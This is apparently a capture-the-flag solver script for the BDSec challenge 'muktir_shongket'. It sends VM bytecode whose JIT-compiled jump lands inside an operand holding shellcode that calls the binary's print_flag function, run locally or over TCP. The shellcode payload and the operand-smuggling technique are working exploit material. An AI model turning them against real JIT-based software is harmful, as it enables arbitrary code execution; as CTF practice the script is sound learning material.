#!/usr/bin/env python3
"""Solver for the BDSec CTF challenge `muktir_shongket`.

Usage:
  python3 solve_muktir.py local ./muktir_shongket
  python3 solve_muktir.py remote HOST PORT

No third-party packages are required.
"""

from __future__ import annotations

import argparse
import os
import re
import select
import socket
import subprocess
import sys
import time
from typing import BinaryIO

# VM bytecode:
#   ROUTE +2
#   SIGNAL <8 arbitrary bytes>
#   END
#
# The JIT turns ROUTE +2 into `jmp +2`, landing inside SIGNAL's embedded
# 8-byte operand. Those bytes become:
#   mov eax, 0x401bb0   ; internal print_flag function (non-PIE binary)
#   call rax
#   ret
PAYLOAD_HEX = b"300220b8b01b4000ffd0c340"
MENU_INPUT = b"1\n" + PAYLOAD_HEX + b"\n3\n4\n6\n"
FLAG_RE = re.compile(rb"(?:BDSEC|FLAG|CTF)\{[^\r\n}]+\}", re.IGNORECASE)


def show_result(data: bytes) -> int:
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b"\n"):
        print()

    flags = FLAG_RE.findall(data)
    if flags:
        print(f"[+] Flag: {flags[-1].decode(errors='replace')}")
        return 0

    print("[-] No flag pattern found in output.", file=sys.stderr)
    return 1


def solve_local(binary: str, timeout: float) -> int:
    binary = os.path.abspath(binary)
    if not os.path.isfile(binary):
        print(f"[-] Binary not found: {binary}", file=sys.stderr)
        return 2

    try:
        os.chmod(binary, os.stat(binary).st_mode | 0o100)
        proc = subprocess.run(
            [binary],
            input=MENU_INPUT,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=os.path.dirname(binary) or ".",
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired as exc:
        data = exc.stdout or b""
        sys.stdout.buffer.write(data)
        print(f"\n[-] Local process timed out after {timeout}s.", file=sys.stderr)
        return 2
    except OSError as exc:
        print(f"[-] Failed to execute binary: {exc}", file=sys.stderr)
        return 2

    return show_result(proc.stdout)


def recv_until_idle(sock: socket.socket, total_timeout: float, idle_timeout: float = 0.5) -> bytes:
    chunks: list[bytes] = []
    deadline = time.monotonic() + total_timeout
    last_data = time.monotonic()

    while time.monotonic() < deadline:
        wait = min(idle_timeout, max(0.0, deadline - time.monotonic()))
        readable, _, _ = select.select([sock], [], [], wait)
        if not readable:
            if chunks and time.monotonic() - last_data >= idle_timeout:
                break
            continue

        chunk = sock.recv(4096)
        if not chunk:
            break
        chunks.append(chunk)
        last_data = time.monotonic()

    return b"".join(chunks)


def solve_remote(host: str, port: int, timeout: float) -> int:
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.setblocking(False)

            # Drain the initial banner, then send the complete menu sequence.
            banner = recv_until_idle(sock, min(timeout, 2.0), idle_timeout=0.25)
            sock.setblocking(True)
            sock.sendall(MENU_INPUT)
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            sock.setblocking(False)
            response = recv_until_idle(sock, timeout, idle_timeout=1.0)
            return show_result(banner + response)
    except ConnectionRefusedError:
        print(f"[-] Connection refused by {host}:{port}.", file=sys.stderr)
        return 2
    except (OSError, TimeoutError) as exc:
        print(f"[-] Remote connection failed: {exc}", file=sys.stderr)
        return 2


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit muktir_shongket locally or remotely")
    parser.add_argument("--timeout", type=float, default=8.0, help="I/O timeout in seconds")
    sub = parser.add_subparsers(dest="mode", required=True)

    local = sub.add_parser("local", help="run against a local binary")
    local.add_argument("binary", nargs="?", default="./muktir_shongket")

    remote = sub.add_parser("remote", help="run against a TCP challenge service")
    remote.add_argument("host")
    remote.add_argument("port", type=int)

    args = parser.parse_args()
    if args.mode == "local":
        return solve_local(args.binary, args.timeout)
    return solve_remote(args.host, args.port, args.timeout)


if __name__ == "__main__":
    raise SystemExit(main())
